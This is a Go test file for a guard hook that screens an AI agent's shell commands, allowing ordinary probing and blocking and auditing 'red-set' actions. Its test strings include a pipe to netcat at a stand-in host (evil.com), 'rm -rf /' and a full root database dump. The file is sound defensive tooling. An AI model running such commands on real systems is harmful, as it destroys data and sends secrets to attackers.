package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// Without an interceptor, ordinary recon/probing passes through, but red-set
// actions (package redset) are blocked outright: there is no approval channel to
// obtain operator sign-off. Every call is still recorded to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
		`nmap -sV acme.com`,
		`rm -rf __pycache__`,
	} {
		if block(cmd) {
			t.Errorf("non-red-set command should pass without an interceptor, got block for %q", cmd)
		}
	}
	for _, cmd := range []string{
		`rm -rf /`,
		`mysqldump -u root --all-databases`,
	} {
		if !block(cmd) {
			t.Errorf("red-set command must be blocked even without an interceptor: %q", cmd)
		}
	}
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse
